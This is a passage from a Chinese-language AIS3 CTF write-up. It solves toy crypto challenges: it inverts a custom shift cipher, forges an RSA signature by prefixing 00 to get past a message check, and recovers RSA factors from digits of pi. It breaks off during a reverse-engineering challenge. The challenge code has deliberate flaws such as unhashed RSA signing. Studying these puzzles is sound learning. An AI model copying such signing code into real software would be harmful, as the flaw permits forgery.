title="Crypto"></a>Crypto</h2><h3 id="Microchip-102"><a href="#Microchip-102" class="headerlink" title="Microchip(102)"></a>Microchip(102)</h3><blockquote><p>Author: toxicpie</p></blockquote><div class="spoiler collapsed">    <div class="spoiler-title">        整理後的題目如下    </div>    <div class="spoiler-content">        <pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#include "python.h"</span><span class="token keyword">def</span> <span class="token function">track</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> id<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>len<span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">4</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">:</span>        padded <span class="token operator">=</span> name <span class="token operator">+</span> <span class="token string">"4444"</span>                                                      <span class="token keyword">elif</span> <span class="token punctuation">(</span>len<span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">4</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">:</span>        padded <span class="token operator">=</span> name <span class="token operator">+</span> <span class="token string">"333"</span>                                                       <span class="token keyword">elif</span> <span class="token punctuation">(</span>len<span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">4</span> <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">:</span>        padded <span class="token operator">=</span> name <span class="token operator">+</span> <span class="token string">"22"</span>                                                        <span class="token keyword">elif</span> <span class="token punctuation">(</span>len<span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">4</span> <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">:</span>        padded <span class="token operator">=</span> name <span class="token operator">+</span> <span class="token string">"1"</span>    keys <span class="token operator">=</span> list<span class="token punctuation">(</span><span class="token punctuation">)</span>    temp <span class="token operator">=</span> id    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        keys<span class="token punctuation">.</span>append<span class="token punctuation">(</span>temp <span class="token operator">%</span> <span class="token number">96</span><span class="token punctuation">)</span>        temp <span class="token operator">=</span> int<span class="token punctuation">(</span>temp <span class="token operator">/</span> <span class="token number">96</span><span class="token punctuation">)</span>    result <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> len<span class="token punctuation">(</span>padded<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">:</span>   <span class="token comment" spellcheck="true">#10 round</span>        nums <span class="token operator">=</span> list<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">:</span>            num <span class="token operator">=</span> ord<span class="token punctuation">(</span>padded<span class="token punctuation">[</span>i <span class="token operator">+</span> j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">32</span>            num <span class="token operator">=</span> <span class="token punctuation">(</span>num <span class="token operator">+</span> keys<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">96</span>            nums<span class="token punctuation">.</span>append<span class="token punctuation">(</span>num <span class="token operator">+</span> <span class="token number">32</span><span class="token punctuation">)</span>        result <span class="token operator">+=</span> chr<span class="token punctuation">(</span>nums<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        result <span class="token operator">+=</span> chr<span class="token punctuation">(</span>nums<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        result <span class="token operator">+=</span> chr<span class="token punctuation">(</span>nums<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        result <span class="token operator">+=</span> chr<span class="token punctuation">(</span>nums<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> result  <span class="token comment" spellcheck="true">#len -> 40</span>name <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">"flag.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>id <span class="token operator">=</span> int<span class="token punctuation">(</span>input<span class="token punctuation">(</span><span class="token string">"key = "</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"result is:"</span><span class="token punctuation">,</span> track<span class="token punctuation">(</span>name<span class="token punctuation">,</span> id<span class="token punctuation">)</span><span class="token punctuation">)</span> </code></pre>    </div></div><p>output： <code>=Js&amp;;*A``odZHi\'&gt;D=Js&amp;#i-DYf&gt;Uy\'yuyfyu&lt;)Gu</code><br>把 FLAG 每四個字就翻轉，接著加上 key 後 mod 96，再加上 32 後取字元值，就會得到 output<br>只要有 key 就可以用 result 逆推回 flag<br>由於我們知道 flag format = <code>AIS3{printable}</code>，因此利用<code>AIS3</code>就可以輕易逆推 key<br>4 個而已慢慢用手推即可</p><div class="spoiler collapsed">    <div class="spoiler-title">        推 key    </div>    <div class="spoiler-content">        <p>把 <code>result</code> 推回陣列(如下script)，取前四個數字(6,83,42,29)</p><pre class=" language-cpp"><code class="language-cpp"><span class="token function">ord</span><span class="token punctuation">(</span><span class="token string">'A'</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">32</span> <span class="token operator">=</span> <span class="token function">33</span><span class="token punctuation">(</span> <span class="token number">33</span> <span class="token operator">+</span> key<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">96</span> <span class="token operator">=</span> <span class="token number">6</span> <span class="token operator">-</span><span class="token operator">></span> key<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">69</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token string">'I'</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">32</span> <span class="token operator">=</span> <span class="token function">41</span><span class="token punctuation">(</span> <span class="token number">41</span> <span class="token operator">+</span> key<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">96</span> <span class="token operator">=</span> <span class="token number">83</span> <span class="token operator">-</span><span class="token operator">></span> key<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">42</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token string">'S'</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">32</span> <span class="token operator">=</span> <span class="token function">51</span><span class="token punctuation">(</span> <span class="token number">51</span> <span class="token operator">+</span> key<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">96</span> <span class="token operator">=</span> <span class="token number">42</span> <span class="token operator">-</span><span class="token operator">></span> key<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">87</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">32</span> <span class="token operator">=</span> <span class="token function">19</span><span class="token punctuation">(</span> <span class="token number">19</span> <span class="token operator">+</span> key<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">96</span> <span class="token operator">=</span> <span class="token number">29</span> <span class="token operator">-</span><span class="token operator">></span> key<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">10</span>key<span class="token operator">=</span><span class="token punctuation">{</span><span class="token number">69</span><span class="token punctuation">,</span><span class="token number">42</span><span class="token punctuation">,</span><span class="token number">87</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">}</span></code></pre>    </div></div><p>接著把 <code>result</code> 依據 key 逆推回去即可<br><strong>script</strong></p><pre class=" language-cpp"><code class="language-cpp">result <span class="token operator">=</span> <span class="token string">'=Js&amp;;*A`odZHi\'>D=Js&amp;#i-DYf>Uy\'yuyfyu&lt;)Gu'</span>n <span class="token operator">=</span> <span class="token function">list</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> i in <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">40</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">:</span>    <span class="token keyword">for</span> j in <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">:</span>        n<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span>result<span class="token punctuation">[</span>i<span class="token operator">+</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token function">print</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token macro property">#n = [29, 42, 83, 6, 27, 10, 33, 64, 79, 68, 58, 40, 73, 7, 30, 36, 29, 42, 83, 6, 3, 73, 13, 36, 57, 70, 30, 53, 89, 7, 89, 85, 89, 70, 89, 85, 28, 9, 39, 85]</span><span class="token keyword">for</span> i in <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">40</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">:</span>    n<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span>n<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>n<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span>n<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> n<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span>n<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span>n<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>n<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token function">print</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token macro property">#n = [6, 83, 42, 29, 64, 33, 10, 27, 40, 58, 68, 79, 36, 30, 7, 73, 6, 83, 42, 29, 36, 13, 73, 3, 53, 30, 70, 57, 85, 89, 7, 89, 85, 89, 70, 89, 85, 39, 9, 28]</span>key <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">69</span><span class="token punctuation">,</span><span class="token number">42</span><span class="token punctuation">,</span><span class="token number">87</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token keyword">for</span> i in <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">)</span><span class="token operator">:</span>    <span class="token function">print</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>n<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">96</span> <span class="token operator">-</span> key<span class="token punctuation">[</span>i<span class="token operator">%</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">96</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span></code></pre><p>執行 script 後得到<code>AIS3{w31c0me_t0_AIS3_cryptoO0O0o0Ooo0}22</code> 可以看到 padding 為 22</p><blockquote><p>flag <code>AIS3{w31c0me_t0_AIS3_cryptoO0O0o0Ooo0}</code></p></blockquote><h3 id="ReSident-evil-villAge-136"><a href="#ReSident-evil-villAge-136" class="headerlink" title="ReSident evil villAge(136)"></a>ReSident evil villAge(136)</h3><blockquote><p>註：此題用了非正規解</p></blockquote><div class="spoiler collapsed">    <div class="spoiler-title">        題目 Source code如下    </div>    <div class="spoiler-content">        <pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> socketserver<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>PublicKey <span class="token keyword">import</span> RSA<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> binascii <span class="token keyword">import</span> unhexlify<span class="token keyword">class</span> <span class="token class-name">Task</span><span class="token punctuation">(</span>socketserver<span class="token punctuation">.</span>BaseRequestHandler<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">recv</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">send</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> msg<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>msg <span class="token operator">+</span> b<span class="token string">'\n'</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">handle</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        privkey <span class="token operator">=</span> RSA<span class="token punctuation">.</span>generate<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>        n <span class="token operator">=</span> privkey<span class="token punctuation">.</span>n        e <span class="token operator">=</span> privkey<span class="token punctuation">.</span>e        self<span class="token punctuation">.</span>send<span class="token punctuation">(</span>b<span class="token string">'Welcome to ReSident evil villAge, sign the name "Ethan Winters" to get the flag.'</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>send<span class="token punctuation">(</span>b<span class="token string">'n = '</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>send<span class="token punctuation">(</span>b<span class="token string">'e = '</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>b<span class="token string">'1) sign\n2) verify\n3) exit\n'</span><span class="token punctuation">)</span>            option <span class="token operator">=</span> self<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> option <span class="token operator">==</span> b<span class="token string">'1'</span><span class="token punctuation">:</span>                self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>b<span class="token string">'Name (in hex): '</span><span class="token punctuation">)</span>                msg <span class="token operator">=</span> unhexlify<span class="token punctuation">(</span>self<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> msg <span class="token operator">==</span> b<span class="token string">'Ethan Winters'</span> <span class="token operator">or</span> bytes_to_long<span class="token punctuation">(</span>msg<span class="token punctuation">)</span> <span class="token operator">>=</span> n<span class="token punctuation">:</span>  <span class="token comment" spellcheck="true"># msg+k*n not allowed</span>                    self<span class="token punctuation">.</span>send<span class="token punctuation">(</span>b<span class="token string">'Nice try!'</span><span class="token punctuation">)</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    sig <span class="token operator">=</span> pow<span class="token punctuation">(</span>bytes_to_long<span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">,</span> privkey<span class="token punctuation">.</span>d<span class="token punctuation">,</span> n<span class="token punctuation">)</span>     <span class="token comment" spellcheck="true"># TODO: Apply hashing first to prevent forgery</span>                    self<span class="token punctuation">.</span>send<span class="token punctuation">(</span>b<span class="token string">'Signature: '</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>sig<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">elif</span> option <span class="token operator">==</span> b<span class="token string">'2'</span><span class="token punctuation">:</span>                self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>b<span class="token string">'Signature: '</span><span class="token punctuation">)</span>                sig <span class="token operator">=</span> int<span class="token punctuation">(</span>self<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                verified <span class="token operator">=</span> <span class="token punctuation">(</span>pow<span class="token punctuation">(</span>sig<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span> <span class="token operator">==</span> bytes_to_long<span class="token punctuation">(</span>b<span class="token string">'Ethan Winters'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> verified<span class="token punctuation">:</span>                    self<span class="token punctuation">.</span>send<span class="token punctuation">(</span>b<span class="token string">'AIS3{THIS_IS_A_FAKE_FLAG}'</span><span class="token punctuation">)</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    self<span class="token punctuation">.</span>send<span class="token punctuation">(</span>b<span class="token string">'Well done!'</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">break</span><span class="token keyword">class</span> <span class="token class-name">ForkingServer</span><span class="token punctuation">(</span>socketserver<span class="token punctuation">.</span>ForkingTCPServer<span class="token punctuation">,</span> socketserver<span class="token punctuation">.</span>TCPServer<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">pass</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    HOST<span class="token punctuation">,</span> PORT <span class="token operator">=</span> <span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> <span class="token number">42069</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>HOST<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span>    server <span class="token operator">=</span> ForkingServer<span class="token punctuation">(</span><span class="token punctuation">(</span>HOST<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span><span class="token punctuation">,</span> Task<span class="token punctuation">)</span>    server<span class="token punctuation">.</span>allow_reuse_address <span class="token operator">=</span> <span class="token boolean">True</span>    server<span class="token punctuation">.</span>serve_forever<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>    </div></div><p>題目是 RSA 簽證<br>目標是把 signature 送進去以達到 <code>pow(sig, e, n) == bytes_to_long(b'Ethan Winters')</code><br>原則上只要把 Ethan Winters 轉成 hex 丟進去讓它跑出 signature 之後，再丟回去讓他 verify 就可以了。<br>但是從 <code>if msg == b'Ethan Winters' or bytes_to_long(msg) &gt;= n:  # msg+k*n not allowed</code> 這行可以看到 <code>check msg == Ethan Winters</code> 會被擋掉。<br>由於送進去的是字串，於是要讓<strong>數字不變但是字串改變</strong>，就去嘗試 Bypass，發現前面加上 <code>00</code> 可以繞過，所以傳 <code>00</code> 加上 <code>Ethan Winters</code> 轉成 <code>hex</code> 就可以了<br>直接上圖。<br><img src="https://i.imgur.com/Kwxy3WU.png"><br><img src="https://i.imgur.com/4dpX7qf.png"></p><h3 id="Republic-of-South-Africa-235"><a href="#Republic-of-South-Africa-235" class="headerlink" title="Republic of South Africa (235)"></a>Republic of South Africa (235)</h3><blockquote><p>RSA collision or something IDK I am a physicist<br>Author: Kuruwa</p></blockquote><div class="spoiler collapsed">    <div class="spoiler-title">        題目 Source code如下    </div>    <div class="spoiler-content">        <p>chall.py</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> secret <span class="token keyword">import</span> flag<span class="token keyword">import</span> random<span class="token keyword">import</span> gmpy2gmpy2<span class="token punctuation">.</span>get_context<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>precision <span class="token operator">=</span> <span class="token number">1024</span><span class="token keyword">def</span> <span class="token function">collision</span><span class="token punctuation">(</span>m1<span class="token punctuation">,</span> v1<span class="token punctuation">,</span> m2<span class="token punctuation">,</span> v2<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> v1<span class="token operator">*</span><span class="token punctuation">(</span>m1<span class="token operator">-</span>m2<span class="token punctuation">)</span><span class="token operator">/</span><span class="token punctuation">(</span>m1<span class="token operator">+</span>m2<span class="token punctuation">)</span> <span class="token operator">+</span> v2<span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">*</span>m2<span class="token punctuation">)</span><span class="token operator">/</span><span class="token punctuation">(</span>m1<span class="token operator">+</span>m2<span class="token punctuation">)</span><span class="token punctuation">,</span> v1<span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">*</span>m1<span class="token punctuation">)</span><span class="token operator">/</span><span class="token punctuation">(</span>m1<span class="token operator">+</span>m2<span class="token punctuation">)</span> <span class="token operator">+</span> v2<span class="token operator">*</span><span class="token punctuation">(</span>m2<span class="token operator">-</span>m1<span class="token punctuation">)</span><span class="token operator">/</span><span class="token punctuation">(</span>m1<span class="token operator">+</span>m2<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">keygen</span><span class="token punctuation">(</span>digits<span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token comment" spellcheck="true"># Warning: slow implementation</span>    m1 <span class="token operator">=</span> <span class="token number">1</span>    m2 <span class="token operator">=</span> <span class="token number">10</span> <span class="token operator">**</span> <span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">*</span>digits<span class="token number">-2</span><span class="token punctuation">)</span>    v1 <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>mpfr<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    v2 <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>mpfr<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>    count <span class="token operator">=</span> <span class="token number">0</span>       <span class="token comment" spellcheck="true"># p+q</span>    <span class="token keyword">while</span> abs<span class="token punctuation">(</span>v1<span class="token punctuation">)</span> <span class="token operator">></span> v2 <span class="token operator">or</span> v1 <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> v1 <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>            v1 <span class="token operator">=</span> <span class="token operator">-</span>v1        <span class="token keyword">else</span><span class="token punctuation">:</span>            v1<span class="token punctuation">,</span> v2 <span class="token operator">=</span> collision<span class="token punctuation">(</span>m1<span class="token punctuation">,</span> v1<span class="token punctuation">,</span> m2<span class="token punctuation">,</span> v2<span class="token punctuation">)</span>        count <span class="token operator">+=</span> <span class="token number">1</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        p <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span>count<span class="token operator">//</span><span class="token number">3</span><span class="token punctuation">,</span> count<span class="token operator">//</span><span class="token number">2</span><span class="token punctuation">)</span>        q <span class="token operator">=</span> count <span class="token operator">-</span> p        <span class="token keyword">if</span> isPrime<span class="token punctuation">(</span>p<span class="token punctuation">)</span> <span class="token operator">and</span> isPrime<span class="token punctuation">(</span>q<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>    <span class="token keyword">return</span> p<span class="token punctuation">,</span> qp<span class="token punctuation">,</span> q <span class="token operator">=</span> keygen<span class="token punctuation">(</span><span class="token number">153</span><span class="token punctuation">)</span>n <span class="token operator">=</span> p<span class="token operator">*</span>qe <span class="token operator">=</span> <span class="token number">65537</span>m <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'n ='</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'e ='</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'c ='</span><span class="token punctuation">,</span> pow<span class="token punctuation">(</span>m<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>    </div></div><p>從題目名稱很明顯可以知道是 RSA</p><pre class=" language-bash"><code class="language-bash">count <span class="token operator">=</span> p+qn <span class="token operator">=</span> p*q</code></pre><p>由於這兩個式子，可以很輕易地推出 <code>phi </code><br><code>phi = (p-1)*(q-1) = p*q - (p+q) +1 = n - count +1</code><br>既然我們已經有 <code>n</code> 了，那目標是要求出 <code>count</code><br>但 <code>count</code> 會是非常大的數字，根本沒辦法爆搜</p><blockquote><p>TMI:當時因為 <code>collision()</code> 是物理中完全彈性碰撞的公式，所以花很多時間在研究那邊QQ</p></blockquote><p>於是把函式丟進去 ipython 裡面看看有什麼<br>發現 <code>count</code> 長得很像 <code>pi</code> ，而且位數會等於丟給 <code>keygen()</code> 的值<br><code>digits</code> 就代表位數<br>於是便上網查了 153 位數的 <code>pi</code><br>接著按照一般 RSA 流程就可以得到flag了</p><p><img src="https://i.imgur.com/2uZKwqU.jpg" alt="keygen"></p><p><strong>script</strong></p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>n <span class="token operator">=</span> <span class="token number">23662270311503602529211462628663973377651035055221337186547659666520360329842954292759496973737109678655075242892199643594552737098393308599593056828393773327639809644570618472781338585802514939812387999523164606025662379300143159103239039862833152034195535186138249963826772564309026532268561022599227047</span>e <span class="token operator">=</span> <span class="token number">65537</span>c <span class="token operator">=</span> <span class="token number">11458615427536252698065643586706850515055080432343893818398610010478579108516179388166781637371605857508073447120074461777733767824330662610330121174203247272860627922171793234818603728793293847713278049996058754527159158251083995933600335482394024095666411743953262490304176144151437205651312338816540536</span>count<span class="token operator">=</span><span class="token number">314159265358979323846264338327950288419716939937510582097494459230781640628620899862803482534211706798214808651328230664709384460955058223172535940812848</span>phi <span class="token operator">=</span> n<span class="token operator">-</span>count<span class="token operator">+</span><span class="token number">1</span>d <span class="token operator">=</span> inverse<span class="token punctuation">(</span>e<span class="token punctuation">,</span>phi<span class="token punctuation">)</span>m <span class="token operator">=</span> pow<span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><blockquote><p>flag <code>AIS3{https://www.youtube.com/watch?v=jsYwFizhncE}</code><br>順帶一提 flag 內的 <a href="https://www.youtube.com/watch?v=jsYwFizhncE">youtube 網址</a>是利用物理的彈性碰撞去計算<code>pi</code>，還滿有趣的，感興趣的可以去看看影片~~</p></blockquote><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="Piano-158"><a href="#Piano-158" class="headerlink" title="Piano(158)"></a>Piano(158)</h3><blockquote><p>Is this a MUSIC GAME?<br>Author: CSY54</p></blockquote><p>題目給了一個 <code>.exe 檔</code>，執行後會是鋼琴界面(真的有聲音)<br><img src="https://i.imgur.com/9EgZvRS.png" alt="Piano"><br>題目還給一個 <code>.dll 檔</code>，可以用 <code>dnSpy</code> 來 <strong>反編譯</strong> ，就可以看到它在做的事情</p><blockquote><p>註 記得<a href="https://www.youtube.com/watch?v=6BzBLzLnVk4&amp;t=6885s">SCIST Reverse III</a>是在講各種技巧，所以就在比賽第一天晚上去看了這個影片，到1:29:15 的時候開始講 C#、Net，其中有講到 dnSpy 這個工具的用法，推薦大家去看~~~</p></blockquote><div class="spoiler collapsed">    <div class="spoiler-title">        isValid()    </div>    <div class="spoiler-content">        <pre class=" language-cpp"><code class="language-cpp"><span class="token comment" spellcheck="true">// piano.Piano</span><span class="token comment" spellcheck="true">// Token: 0x06000003 RID: 3 RVA: 0x00002220 File Offset: 0x00000420</span><span class="token keyword">private</span> <span class="token keyword">bool</span> <span class="token function">isValid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    List<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> list 